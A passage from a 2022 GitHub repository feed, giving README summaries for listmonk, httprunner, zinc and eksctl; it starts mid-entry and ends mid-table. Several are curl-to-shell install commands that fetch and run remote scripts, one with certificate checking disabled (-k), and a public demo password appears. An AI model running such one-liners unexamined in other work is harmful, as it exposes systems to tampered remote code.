    <summary type="html">&lt;p&gt;High performance, self-hosted, newsletter and mailing list manager with a modern dashboard. Single binary app.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://zerodha.tech&#34;&gt;&lt;img src=&#34;https://zerodha.tech/static/images/github-badge.svg?sanitize=true&#34; align=&#34;right&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://listmonk.app&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/547147/134940003-1de03d83-8c7b-459b-8056-baa8d5f3b448.png&#34; alt=&#34;listmonk-logo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;listmonk is a standalone, self-hosted, newsletter and mailing list manager. It is fast, feature-rich, and packed into a single binary. It uses a PostgreSQL (⩾ v9.4) database as its data store.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://listmonk.app&#34;&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/547147/134939475-e0391111-f762-44cb-b056-6cb0857755e3.png&#34; alt=&#34;listmonk-dashboard&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Visit &lt;a href=&#34;https://listmonk.app&#34;&gt;listmonk.app&lt;/a&gt; for more info. Check out the &lt;a href=&#34;https://demo.listmonk.app&#34;&gt;&lt;strong&gt;live demo&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Docker&lt;/h3&gt; &#xA;&lt;p&gt;The latest image is available on DockerHub at &lt;a href=&#34;https://hub.docker.com/r/listmonk/listmonk/tags?page=1&amp;amp;ordering=last_updated&amp;amp;name=latest&#34;&gt;&lt;code&gt;listmonk/listmonk:latest&lt;/code&gt;&lt;/a&gt;. Use the sample &lt;a href=&#34;https://github.com/knadh/listmonk/raw/master/docker-compose.yml&#34;&gt;docker-compose.yml&lt;/a&gt; to run manually or use the helper script.&lt;/p&gt; &#xA;&lt;h4&gt;Demo&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir listmonk-demo &amp;amp;&amp;amp; cd listmonk-demo&#xA;sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/knadh/listmonk/master/install-demo.sh)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DO NOT use this demo setup in production.&lt;/p&gt; &#xA;&lt;h4&gt;Production&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir listmonk &amp;amp;&amp;amp; cd listmonk&#xA;sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/knadh/listmonk/master/install-prod.sh)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Visit &lt;code&gt;http://localhost:9000&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Always examine the contents of shell scripts before executing them.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://listmonk.app/docs/installation&#34;&gt;installation docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Binary&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Download the &lt;a href=&#34;https://github.com/knadh/listmonk/releases&#34;&gt;latest release&lt;/a&gt; and extract the listmonk binary.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;./listmonk --new-config&lt;/code&gt; to generate config.toml. Then, edit the file.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;./listmonk --install&lt;/code&gt; to setup the Postgres DB (or &lt;code&gt;--upgrade&lt;/code&gt; to upgrade an existing DB. Upgrades are idempotent and running them multiple times have no side effects).&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;./listmonk&lt;/code&gt; and visit &lt;code&gt;http://localhost:9000&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://listmonk.app/docs/installation&#34;&gt;installation docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Developers&lt;/h2&gt; &#xA;&lt;p&gt;listmonk is a free and open source software licensed under AGPLv3. If you are interested in contributing, refer to the &lt;a href=&#34;https://listmonk.app/docs/developer-setup&#34;&gt;developer setup&lt;/a&gt;. The backend is written in Go and the frontend is Vue with Buefy for UI.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;listmonk is licensed under the AGPL v3 license.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>httprunner/httprunner</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/httprunner/httprunner</id>
    <link href="https://github.com/httprunner/httprunner" rel="alternate"></link>
    <summary type="html">&lt;p&gt;HttpRunner 是一个开源的 API 测试工具，支持 HTTP(S) / HTTP2 / WebSocket / RPC 等网络协议，涵盖接口测试、性能测试、数字体验监测等测试类型。简单易用，功能强大，具有丰富的插件化机制和高度的可扩展能力。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;HttpRunner&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/httprunner/httprunner/actions&#34;&gt;&lt;img src=&#34;https://github.com/httprunner/httprunner/actions/workflows/unittest.yml/badge.svg?sanitize=true&#34; alt=&#34;Github Actions&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/httprunner/httprunner&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/httprunner/httprunner/branch/master/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pkg.go.dev/github.com/httprunner/httprunner&#34;&gt;&lt;img src=&#34;https://pkg.go.dev/badge/github.com/httprunner/httprunner.svg?sanitize=true&#34; alt=&#34;Go Reference&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pepy.tech/project/httprunner&#34;&gt;&lt;img src=&#34;https://pepy.tech/badge/httprunner&#34; alt=&#34;downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/httprunner&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/v/httprunner.svg?sanitize=true&#34; alt=&#34;pypi version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/httprunner&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/httprunner.svg?sanitize=true&#34; alt=&#34;pyversions&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://testerhome.com/github_statistics&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/TTF-TesterHome-2955C5.svg?sanitize=true&#34; alt=&#34;TesterHome&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;HttpRunner&lt;/code&gt; 是一个开源的 API 测试工具，支持 HTTP(S)/HTTP2/WebSocket/RPC 等网络协议，涵盖接口测试、性能测试、数字体验监测等测试类型。简单易用，功能强大，具有丰富的插件化机制和高度的可扩展能力。&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;HttpRunner &lt;a href=&#34;https://wj.qq.com/s2/9699514/0d19/&#34;&gt;用户调研问卷&lt;/a&gt; 持续收集中，我们将基于用户反馈动态调整产品特性和需求优先级。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://httprunner.com/image/hrp-flow.jpg&#34; alt=&#34;flow chart&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/httprunner/httprunner/master/docs/CHANGELOG.md&#34;&gt;版本发布日志&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/httprunner/httprunner/master/README.en.md&#34;&gt;English&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;设计理念&lt;/h2&gt; &#xA;&lt;p&gt;相比于其它 API 测试工具，HttpRunner 最大的不同在于设计理念。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;约定大于配置：测试用例是标准结构化的，格式统一，方便协作和维护&lt;/li&gt; &#xA; &lt;li&gt;标准开放：基于开放的标准，支持与 &lt;a href=&#34;https://en.wikipedia.org/wiki/HAR_(file_format)&#34;&gt;HAR&lt;/a&gt;/Postman/Swagger/Curl/JMeter 等工具对接，轻松实现用例生成和转换&lt;/li&gt; &#xA; &lt;li&gt;一次投入多维复用：一套脚本可同时支持接口自动化测试、性能测试、数字体验监测等多种 API 测试需求&lt;/li&gt; &#xA; &lt;li&gt;融入最佳工程实践：不仅仅是一款测试工具，在功能中融入最佳工程实践，实现面向网络协议的一站式测试解决方案&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;核心特性&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;网络协议：完整支持 HTTP(S)/HTTP2/WebSocket，可扩展支持 TCP/UDP/RPC 等更多协议&lt;/li&gt; &#xA; &lt;li&gt;多格式可选：测试用例支持 YAML/JSON/go test/pytest 格式，并且支持格式互相转换&lt;/li&gt; &#xA; &lt;li&gt;双执行引擎：同时支持 golang/python 两个执行引擎，兼具 go 的高性能和 &lt;a href=&#34;https://docs.pytest.org/&#34;&gt;pytest&lt;/a&gt; 的丰富生态&lt;/li&gt; &#xA; &lt;li&gt;录制 &amp;amp; 生成：可使用 &lt;a href=&#34;https://en.wikipedia.org/wiki/HAR_(file_format)&#34;&gt;HAR&lt;/a&gt;/Postman/Swagger/curl 等生成测试用例；基于链式调用的方法提示也可快速编写测试用例&lt;/li&gt; &#xA; &lt;li&gt;复杂场景：基于 variables/extract/validate/hooks 机制可以方便地创建任意复杂的测试场景&lt;/li&gt; &#xA; &lt;li&gt;插件化机制：内置丰富的函数库，同时可以基于主流编程语言（go/python/java）编写自定义函数轻松实现更多能力&lt;/li&gt; &#xA; &lt;li&gt;性能测试：无需额外工作即可实现压力测试；单机可轻松支撑 &lt;code&gt;1w+&lt;/code&gt; VUM，结合分布式负载能力可实现海量发压&lt;/li&gt; &#xA; &lt;li&gt;网络性能采集：在场景化接口测试的基础上，可额外采集网络链路性能指标（DNS 解析、TCP 连接、SSL 握手、网络传输等）&lt;/li&gt; &#xA; &lt;li&gt;一键部署：采用二进制命令行工具分发，无需环境依赖，一条命令即可在 macOS/Linux/Windows 快速完成安装部署&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;用户声音&lt;/h2&gt; &#xA;&lt;p&gt;基于 252 份调研问卷的统计结果，HttpRunner 用户的整体满意度评分 &lt;code&gt;4.3/5&lt;/code&gt;，最喜欢的特性包括：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;简单易用：测试用例支持 YAML/JSON 标准化格式，可通过录制的方式快速生成用例，上手简单，使用方便&lt;/li&gt; &#xA; &lt;li&gt;功能强大：支持灵活的自定义函数和 hook 机制，参数变量、数据驱动、结果断言等机制一应俱全，轻松适应各种复杂场景&lt;/li&gt; &#xA; &lt;li&gt;设计理念：测试用例组织支持分层设计，格式统一，易于实现测试用例的维护和复用&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;更多内容详见 &lt;a href=&#34;https://httprunner.com/blog/user-survey-report/&#34;&gt;HttpRunner 首轮用户调研报告（2022.02）&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;一键部署&lt;/h2&gt; &#xA;&lt;p&gt;HttpRunner 二进制命令行工具已上传至阿里云 OSS，在系统终端中执行如下命令可完成安装部署。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ bash -c &#34;$(curl -ksSL https://httprunner.com/script/install.sh)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;安装成功后，你将获得一个 &lt;code&gt;hrp&lt;/code&gt; 命令行工具，执行 &lt;code&gt;hrp -h&lt;/code&gt; 即可查看到参数帮助说明。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ hrp -h&#xA;&#xA;██╗  ██╗████████╗████████╗██████╗ ██████╗ ██╗   ██╗███╗   ██╗███╗   ██╗███████╗██████╗&#xA;██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║   ██║████╗  ██║████╗  ██║██╔════╝██╔══██╗&#xA;███████║   ██║      ██║   ██████╔╝██████╔╝██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝&#xA;██╔══██║   ██║      ██║   ██╔═══╝ ██╔══██╗██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗&#xA;██║  ██║   ██║      ██║   ██║     ██║  ██║╚██████╔╝██║ ╚████║██║ ╚████║███████╗██║  ██║&#xA;╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝&#xA;&#xA;HttpRunner is an open source API testing tool that supports HTTP(S)/HTTP2/WebSocket/RPC&#xA;network protocols, covering API testing, performance testing and digital experience&#xA;monitoring (DEM) test types. Enjoy! ✨ 🚀 ✨&#xA;&#xA;License: Apache-2.0&#xA;Website: https://httprunner.com&#xA;Github: https://github.com/httprunner/httprunner&#xA;Copyright 2017 debugtalk&#xA;&#xA;Usage:&#xA;  hrp [command]&#xA;&#xA;Available Commands:&#xA;  boom         run load test with boomer&#xA;  completion   generate the autocompletion script for the specified shell&#xA;  har2case     convert HAR to json/yaml testcase files&#xA;  help         Help about any command&#xA;  pytest       run API test with pytest&#xA;  run          run API test with go engine&#xA;  startproject create a scaffold project&#xA;&#xA;Flags:&#xA;  -h, --help               help for hrp&#xA;      --log-json           set log to json format&#xA;  -l, --log-level string   set log level (default &#34;INFO&#34;)&#xA;  -v, --version            version for hrp&#xA;&#xA;Use &#34;hrp [command] --help&#34; for more information about a command.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;用户案例&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://httprunner.com/docs/cases/dji-ibg&#34;&gt;&lt;img src=&#34;https://httprunner.com/image/logo/dji.jpeg&#34; title=&#34;大疆 - 基于 HttpRunner 构建完整的自动化测试体系&#34; width=&#34;60&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://httprunner.com/docs/cases/bytedance-feishu&#34;&gt;&lt;img src=&#34;https://httprunner.com/image/logo/feishu.jpeg&#34; title=&#34;飞书 - 使用 HttpRunner 替换已有测试平台的执行引擎&#34; width=&#34;60&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;赞助商&lt;/h2&gt; &#xA;&lt;h3&gt;金牌赞助商&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ceshiren.com/&#34;&gt;&lt;img src=&#34;https://httprunner.com/image/hogwarts.jpeg&#34; alt=&#34;霍格沃兹测试开发学社&#34; width=&#34;400&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;http://qrcode.testing-studio.com/f?from=httprunner&amp;amp;url=https://ceshiren.com&#34;&gt;霍格沃兹测试开发学社&lt;/a&gt;是业界领先的测试开发技术高端教育品牌，隶属于&lt;a href=&#34;http://qrcode.testing-studio.com/f?from=httprunner&amp;amp;url=https://www.testing-studio.com&#34;&gt;测吧（北京）科技有限公司&lt;/a&gt; 。学院课程由一线大厂测试经理与资深测试开发专家参与研发，实战驱动。课程涵盖 web/app 自动化测试、接口测试、性能测试、安全测试、持续集成/持续交付/DevOps，测试左移&amp;amp;右移、精准测试、测试平台开发、测试管理等内容，帮助测试工程师实现测试开发技术转型。通过优秀的学社制度（奖学金、内推返学费、行业竞赛等多种方式）来实现学员、学社及用人企业的三方共赢。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;http://qrcode.testing-studio.com/f?from=httprunner&amp;amp;url=https://ceshiren.com/t/topic/14940&#34;&gt;进入测试开发技术能力测评!&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;开源服务赞助商&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://sentry.io/_/open-source/&#34;&gt;&lt;img src=&#34;https://httprunner.com/image/sentry-logo-black.svg?sanitize=true&#34; alt=&#34;Sentry&#34; width=&#34;150&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;HttpRunner is in Sentry Sponsored plan.&lt;/p&gt; &#xA;&lt;h2&gt;Subscribe&lt;/h2&gt; &#xA;&lt;p&gt;关注 HttpRunner 的微信公众号，第一时间获得最新资讯。&lt;/p&gt; &#xA;&lt;img src=&#34;https://httprunner.com/image/qrcode.png&#34; alt=&#34;HttpRunner&#34; width=&#34;400&#34;&gt; &#xA;&lt;p&gt;如果你期望加入 HttpRunner 核心用户群，请填写&lt;a href=&#34;https://wj.qq.com/s2/9699514/0d19/&#34;&gt;用户调研问卷&lt;/a&gt;并留下你的联系方式，作者将拉你进群。&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>zinclabs/zinc</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/zinclabs/zinc</id>
    <link href="https://github.com/zinclabs/zinc" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Zinc Search engine. A lightweight alternative to elasticsearch that requires minimal resources, written in Go.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Zinc Search Engine&lt;/h1&gt; &#xA;&lt;p&gt;Zinc is a search engine that does full text indexing. It is a lightweight alternative to Elasticsearch and runs using a fraction of the resources. It uses &lt;a href=&#34;https://github.com/blugelabs/bluge&#34;&gt;bluge&lt;/a&gt; as the underlying indexing library.&lt;/p&gt; &#xA;&lt;p&gt;It is very simple and easy to operate as opposed to Elasticsearch which requires a couple dozen knobs to understand and tune which you can get up and running in 2 minutes&lt;/p&gt; &#xA;&lt;p&gt;It is a drop-in replacement for Elasticsearch if you are just ingesting data using APIs and searching using kibana (Kibana is not supported with zinc. Zinc provides its own UI).&lt;/p&gt; &#xA;&lt;p&gt;Check the below video for a quick demo of Zinc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=aZXtuVjt1ow&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/screenshots/zinc-youtube.jpg&#34; alt=&#34;Zinc Youtube&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Playground Server&lt;/h1&gt; &#xA;&lt;p&gt;You could try ZincSearch without installing using below details:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Server&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://playground.dev.zincsearch.com&#34;&gt;https://playground.dev.zincsearch.com&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;User ID&lt;/td&gt; &#xA;   &lt;td&gt;admin&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Password&lt;/td&gt; &#xA;   &lt;td&gt;Complexpass#123&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Note: Do not store sensitive data on this server as its available to everyone on internet. Data will also be cleaned on this server regularly.&lt;/p&gt; &#xA;&lt;h1&gt;Join slack channel&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://join.slack.com/t/zinc-nvh4832/shared_invite/zt-11r96hv2b-UwxUILuSJ1duzl_6mhJwVg&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/screenshots/slack.png&#34; alt=&#34;Slack&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Why zinc&lt;/h1&gt; &#xA;&lt;p&gt;While Elasticsearch is a very good product, it is complex and requires lots of resources and is more than a decade old. I built Zinc so it becomes easier for folks to use full text search indexing without doing a lot of work.&lt;/p&gt; &#xA;&lt;h1&gt;Features:&lt;/h1&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Provides full text indexing capability&lt;/li&gt; &#xA; &lt;li&gt;Single binary for installation and running. Binaries available under releases for multiple platforms.&lt;/li&gt; &#xA; &lt;li&gt;Web UI for querying data written in Vue&lt;/li&gt; &#xA; &lt;li&gt;Compatibility with Elasticsearch APIs for ingestion of data (single record and bulk API)&lt;/li&gt; &#xA; &lt;li&gt;Out of the box authentication&lt;/li&gt; &#xA; &lt;li&gt;Schema less - No need to define schema upfront and different documents in the same index can have different fields.&lt;/li&gt; &#xA; &lt;li&gt;Index storage in s3 and minio (experimental)&lt;/li&gt; &#xA; &lt;li&gt;aggregation support&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h1&gt;Roadmap items:&lt;/h1&gt; &#xA;&lt;p&gt;Public roadmap is available at &lt;a href=&#34;https://github.com/orgs/zinclabs/projects/3/views/1&#34;&gt;https://github.com/orgs/zinclabs/projects/3/views/1&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Please create an issue if you would like something to be added to the roadmap.&lt;/p&gt; &#xA;&lt;h1&gt;Screenshots&lt;/h1&gt; &#xA;&lt;h2&gt;Search screen&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/screenshots/search_screen.jpg&#34; alt=&#34;Search screen 1&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/screenshots/search_screen_paris.jpg&#34; alt=&#34;Search screen for games&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;User management screen&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/screenshots/users_screen.jpg&#34; alt=&#34;Users screen&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Getting started&lt;/h1&gt; &#xA;&lt;h2&gt;Download / Installation / Run&lt;/h2&gt; &#xA;&lt;p&gt;Check installation &lt;a href=&#34;https://docs.zinclabs.io/04_installation/&#34;&gt;installation docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Data ingestion&lt;/h2&gt; &#xA;&lt;h3&gt;Single record&lt;/h3&gt; &#xA;&lt;p&gt;Check &lt;a href=&#34;https://docs.zinclabs.io/ingestion/single-record/&#34;&gt;single record ingestion docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Bulk ingestion&lt;/h3&gt; &#xA;&lt;p&gt;Check &lt;a href=&#34;https://docs.zinclabs.io/ingestion/bulk-ingestion/#bulk-ingestion&#34;&gt;bulk ingestion docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Fluent bit&lt;/h3&gt; &#xA;&lt;p&gt;Check &lt;a href=&#34;https://docs.zinclabs.io/ingestion/fluent-bit/&#34;&gt;fluet-bit ingestion docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Syslog-ng&lt;/h3&gt; &#xA;&lt;p&gt;Check &lt;a href=&#34;https://docs.zinclabs.io/ingestion/syslog-ng/&#34;&gt;syslog-ng ingestion docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;API Reference&lt;/h2&gt; &#xA;&lt;p&gt;Check &lt;a href=&#34;https://docs.zinclabs.io/API%20Reference/&#34;&gt;Zinc API docs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;How to develop and contribute to Zinc&lt;/h1&gt; &#xA;&lt;p&gt;Check the &lt;a href=&#34;https://raw.githubusercontent.com/zinclabs/zinc/main/CONTRIBUTING.md&#34;&gt;contributing guide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Who uses Zinc (Known users)?&lt;/h1&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://quadrantsec.com/&#34;&gt;Quadrantsec&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://accodeing.com/&#34;&gt;Accodeing to you&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Please do raise a PR adding your details if you are using Zinc.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>weaveworks/eksctl</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/weaveworks/eksctl</id>
    <link href="https://github.com/weaveworks/eksctl" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The official CLI for Amazon EKS&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;code&gt;eksctl&lt;/code&gt; - The official CLI for Amazon EKS&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://coveralls.io/github/weaveworks/eksctl?branch=main&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/weaveworks/eksctl/badge.svg?branch=main&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/weaveworks/eksctl&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/weaveworks/eksctl&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;eksctl&lt;/code&gt; is a simple CLI tool for creating clusters on EKS - Amazon&#39;s new managed Kubernetes service for EC2. It is written in Go, and uses CloudFormation.&lt;/p&gt; &#xA;&lt;p&gt;You can create a cluster in minutes with just one command – &lt;strong&gt;&lt;code&gt;eksctl create cluster&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/weaveworks/eksctl/main/logo/eksctl.png&#34; alt=&#34;Gophers: E, K, S, C, T, &amp;amp; L&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Need help? Join &lt;a href=&#34;https://slack.weave.works/&#34;&gt;Weave Community Slack&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;To download the latest release, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;curl --silent --location &#34;https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz&#34; | tar xz -C /tmp&#xA;sudo mv /tmp/eksctl /usr/local/bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For ARM system, please change ARCH (e.g. armv6, armv7 or arm64) accordingly&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;curl --silent --location &#34;https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_arm64.tar.gz&#34; | tar xz -C /tmp&#xA;sudo mv /tmp/eksctl /usr/local/bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, macOS users can use &lt;a href=&#34;https://brew.sh&#34;&gt;Homebrew&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;brew tap weaveworks/tap&#xA;brew install weaveworks/tap/eksctl&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and Windows users can use &lt;a href=&#34;https://chocolatey.org&#34;&gt;chocolatey&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;chocolatey install eksctl&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or &lt;a href=&#34;https://scoop.sh&#34;&gt;scoop&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;scoop install eksctl&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;AWS Account&lt;/h3&gt; &#xA;&lt;p&gt;You will need to have AWS API credentials configured. What works for AWS CLI or any other tools (kops, Terraform etc), should be sufficient. You can use &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-config-files.html&#34;&gt;&lt;code&gt;~/.aws/credentials&lt;/code&gt; file&lt;/a&gt; or &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-environment.html&#34;&gt;environment variables&lt;/a&gt;. For more information read &lt;a href=&#34;https://docs.aws.amazon.com/cli/latest/userguide/cli-environment.html&#34;&gt;AWS documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You will also need &lt;a href=&#34;https://github.com/kubernetes-sigs/aws-iam-authenticator&#34;&gt;AWS IAM Authenticator for Kubernetes&lt;/a&gt; command (either &lt;code&gt;aws-iam-authenticator&lt;/code&gt; or &lt;code&gt;aws eks get-token&lt;/code&gt; (available in version 1.16.156 or greater of AWS CLI) in your &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The IAM account used for EKS cluster creation should have these minimal access levels.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   